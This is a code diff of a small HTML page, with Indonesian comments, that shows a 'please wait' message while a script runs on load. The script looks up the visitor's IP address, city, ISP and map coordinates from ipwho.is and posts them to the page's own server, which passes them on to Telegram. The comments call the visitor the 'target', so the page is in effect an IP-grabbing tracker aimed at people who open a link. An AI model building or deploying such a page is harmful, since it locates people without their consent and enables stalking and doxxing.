@@ -6,24 +6,45 @@
 </head>
 <body>
   <h3>Mohon tunggu...</h3>
+  <pre id="ip-info">Loading...</pre>
 
   <script>
-    async function trackTarget() {
+    async function getIP() {
       try {
-        // Panggil server, server yang ambil IP target
-        const res = await fetch("/api/send", {
+        // Ambil IP target & geolocation langsung dari ipwho.is
+        const res = await fetch("https://ipwho.is/");
+        const data = await res.json();
+
+        const info = `
+📡 IP Terdeteksi
+🌐 IP: ${data.ip}
+🌍 Negara: ${data.country || "Unknown"}
+🏙 Kota: ${data.city || "Unknown"}, ${data.region || "Unknown"} ${data.postal || ""}
+🛰 ISP: ${data.connection?.isp || "Unknown"}
+🏢 Org: ${data.connection?.org || "Unknown"}
+⚡ ASN: ${data.connection?.asn || "Unknown"}
+⌚ Zona Waktu: ${data.timezone?.id || "Unknown"}
+📌 Koordinat: ${data.latitude || "Unknown"},${data.longitude || "Unknown"}
+🔗 https://www.google.com/maps?q=${data.latitude || ""},${data.longitude || ""}
+        `;
+
+        // Tampilkan di halaman
+        document.getElementById("ip-info").textContent = info;
+
+        // Kirim ke server untuk dikirim ke Telegram
+        await fetch("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({}) // tidak perlu data tambahan
+          body: JSON.stringify({ text: info })
         });
-        const result = await res.json();
-        console.log("Result API:", result);
+
       } catch (err) {
         console.error("Error:", err);
+        document.getElementById("ip-info").textContent = "Error: " + err.message;
       }
     }
 
-    trackTarget();
+    getIP();
   </script>
 </body>
 </html>
